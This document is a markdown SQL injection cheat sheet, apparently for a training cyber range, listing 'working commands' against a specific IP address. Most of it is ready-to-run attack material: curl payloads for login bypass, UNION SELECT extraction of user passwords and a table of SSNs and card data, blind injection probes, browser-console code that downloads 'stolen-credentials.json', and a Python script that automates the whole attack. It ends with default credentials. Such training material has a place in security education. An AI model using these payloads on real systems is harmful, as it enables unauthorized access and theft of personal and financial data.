# SQL Injection Cheat Sheet - W Corp Cyber Range

## 🎯 Quick Reference - Working Commands

All commands tested and verified to work on the W Corp Cyber Range.

---

## 🚀 Authentication Bypass (Easiest)

### Method 1: SQL Comment Bypass (RECOMMENDED)

```bash
# Bypass authentication as admin
curl -X POST http://174.138.71.77/api/legacy-login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''-- ","password":"anything"}'
```

**How it works:** The `-- ` comments out the password check.

**SQL Query:**
```sql
SELECT * FROM users WHERE username = 'admin'-- ' AND password = 'anything'
-- Everything after -- is ignored!
```

---

### Method 2: OR-Based Bypass

```bash
# Login without knowing credentials
curl -X POST http://174.138.71.77/api/legacy-login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"x"}'
```

**SQL Query:**
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'x'
-- '1'='1' is always true!
```

---

### Method 3: Password Field Injection

```bash
curl -X POST http://174.138.71.77/api/legacy-login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"x'\'' OR '\''1'\''='\''1'\''-- "}'
```

---

## 💎 Data Extraction (UNION SELECT)

### Extract All User Credentials

```bash
# The users table has 7 columns, so we need 7 values in UNION SELECT
curl -X POST http://174.138.71.77/api/search \
  -H "Content-Type: application/json" \
  -d '{"query":"test'\'' UNION SELECT * FROM users-- "}'
```

**Expected Response:**
```json
{
  "success": true,
  "results": [
    {
      "id": 1,
      "username": "admin",
      "password": "admin123",
      "email": "admin@wcorp.com",
      "role": "admin"
    },
    {
      "id": 2,
      "username": "john.doe",
      "password": "password123",
      "email": "john.doe@wcorp.com",
      "role": "user"
    }
  ]
}
```

---

### Extract Specific Columns

```bash
# Extract id, username, password (7 columns required)
curl -X POST http://174.138.71.77/api/search \
  -H "Content-Type: application/json" \
  -d '{"query":"test'\'' UNION SELECT id,username,password,email,role,created_at,updated_at FROM users-- "}'
```

---

### Extract Database Version

```bash
curl -X POST http://174.138.71.77/api/search \
  -H "Content-Type: application/json" \
  -d '{"query":"test'\'' UNION SELECT 1,@@version,3,4,5,6,7-- "}'
```

---

### Extract Database Name

```bash
curl -X POST http://174.138.71.77/api/search \
  -H "Content-Type: application/json" \
  -d '{"query":"test'\'' UNION SELECT 1,database(),user(),4,5,6,7-- "}'
```

---

### List All Tables

```bash
curl -X POST http://174.138.71.77/api/search \
  -H "Content-Type: application/json" \
  -d '{"query":"test'\'' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()-- "}'
```

**Expected Tables:**
- users
- sessions
- files
- sensitive_data
- internal_notes

---

### Extract Sensitive Data Table

```bash
# Get all sensitive data (SSNs, credit cards, etc.)
curl -X POST http://174.138.71.77/api/search \
  -H "Content-Type: application/json" \
  -d '{"query":"test'\'' UNION SELECT id,user_id,data_type,data_value,created_at,'\''dummy'\'','\''dummy'\'' FROM sensitive_data-- "}'
```

---

## 🕵️ Blind SQL Injection

### Time-Based Detection

```bash
# If response takes 5 seconds, SQLi exists
curl -X POST http://174.138.71.77/api/legacy-login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR SLEEP(5)-- ","password":"x"}'
```

---

### Boolean-Based Extraction

```bash
# Test if first character of database name is 'w'
curl -X POST http://174.138.71.77/api/legacy-login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' AND SUBSTRING(database(),1,1)='\''w'\''-- ","password":"x"}'

# If login succeeds = true, if fails = false
```

---

## 🧪 Column Count Discovery

```bash
# Test with different numbers of NULLs until it works
curl -X POST http://174.138.71.77/api/search \
  -H "Content-Type: application/json" \
  -d '{"query":"test'\'' UNION SELECT NULL-- "}'

# Keep adding NULLs until no error
curl -X POST http://174.138.71.77/api/search \
  -H "Content-Type: application/json" \
  -d '{"query":"test'\'' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- "}'
# ✅ 7 columns = success!
```

---

## 🌐 Browser-Based Exploitation

### JavaScript Console Attack

```javascript
// Open browser console (F12) on http://174.138.71.77

// SQL Injection via fetch
fetch('/api/legacy-login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    username: "admin'-- ",
    password: "anything"
  })
})
.then(r => r.json())
.then(data => {
  console.log('✅ SQL Injection Success!');
  console.log('Token:', data.token);
  console.log('User:', data.user);
  
  // Store token
  localStorage.setItem('token', data.token);
  localStorage.setItem('user', JSON.stringify(data.user));
  
  // Reload to use new session
  location.href = '/wcorp/admin';
});
```

---

### Extract All Data via Browser

```javascript
// Extract all user credentials
fetch('/api/search', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    query: "test' UNION SELECT * FROM users-- "
  })
})
.then(r => r.json())
.then(data => {
  console.log('💎 All User Credentials:');
  console.table(data.results);
  
  // Download as JSON
  const blob = new Blob([JSON.stringify(data.results, null, 2)], 
    { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = 'stolen-credentials.json';
  a.click();
});
```

---

## 🐍 Python Automation

### Automated Credential Extraction

```python
import requests
import json

BASE_URL = "http://174.138.71.77"

# Method 1: Authentication Bypass
def bypass_login():
    payload = {
        "username": "admin'-- ",
        "password": "anything"
    }
    
    response = requests.post(f"{BASE_URL}/api/legacy-login", json=payload)
    data = response.json()
    
    if data.get('success'):
        print(f"✅ Login successful!")
        print(f"Token: {data['token']}")
        print(f"User: {data['user']}")
        return data['token']
    else:
        print(f"❌ Login failed: {data}")
        return None

# Method 2: Extract All Credentials
def extract_credentials():
    payload = {
        "query": "test' UNION SELECT * FROM users-- "
    }
    
    response = requests.post(f"{BASE_URL}/api/search", json=payload)
    data = response.json()
    
    if data.get('success'):
        print(f"✅ Extracted {len(data['results'])} user records:")
        for user in data['results']:
            print(f"  👤 {user['username']}:{user['password']} ({user['role']})")
        return data['results']
    else:
        print(f"❌ Extraction failed: {data}")
        return None

# Method 3: Extract Sensitive Data
def extract_sensitive_data():
    payload = {
        "query": "test' UNION SELECT id,user_id,data_type,data_value,created_at,'x','x' FROM sensitive_data-- "
    }
    
    response = requests.post(f"{BASE_URL}/api/search", json=payload)
    data = response.json()
    
    if data.get('success'):
        print(f"✅ Extracted sensitive data:")
        for record in data['results']:
            print(f"  🔐 User {record['user_id']}: {record['data_type']} = {record['data_value']}")
        return data['results']
    else:
        print(f"❌ Failed: {data}")
        return None

if __name__ == "__main__":
    print("🎯 W Corp SQL Injection Attack\n")
    
    print("1️⃣ Attempting authentication bypass...")
    token = bypass_login()
    print()
    
    print("2️⃣ Extracting user credentials...")
    users = extract_credentials()
    print()
    
    print("3️⃣ Extracting sensitive data...")
    sensitive = extract_sensitive_data()
    print()
    
    print("✅ Attack complete!")
```

---

## 📊 Database Schema

### Users Table (7 columns)
```
id | username | password | email | role | created_at | updated_at
```

### Default Credentials
```
admin:admin123 (role: admin)
john.doe:password123 (role: user)
jane.smith:qwerty (role: user)
bob.wilson:123456 (role: user)
alice.brown:welcome (role: user)
```

---

## ⚠️ Common Errors & Fixes

### Error: "different number of columns"
**Fix:** The users table has 7 columns. Use:
```bash
UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL
```

### Error: "syntax error near '--'"
**Fix:** Add a space after `--`:
```bash
"username":"admin'-- "  # Note the space!
```

### Error: "Cannot POST /wcorp/api/search"
**Fix:** Remove `/wcorp` from API path:
```bash
# ❌ Wrong: http://174.138.71.77/wcorp/api/search
# ✅ Correct: http://174.138.71.77/api/search
```

---

## 🎓 Learning Path

1. **Start Here:** Authentication bypass with `admin'-- `
2. **Next:** Extract all users with UNION SELECT
3. **Then:** Discover other tables
4. **Advanced:** Extract sensitive_data table
5. **Expert:** Blind SQL injection techniques

---

## 🔗 Additional Resources

- **[VULNERABILITY-GUIDE.md](VULNERABILITY-GUIDE.md#a03---sql-injection)** - Complete SQL injection guide
- **[ATTACK-SUMMARY.md](ATTACK-SUMMARY.md)** - All vulnerability quick reference
- **[UI-ATTACKS-GUIDE.md](UI-ATTACKS-GUIDE.md)** - Client-side attacks

---

**Remember:** This is for educational purposes only in the W Corp Cyber Range training environment!

© 2025 W Corp Cyber Range - Security Training Platform

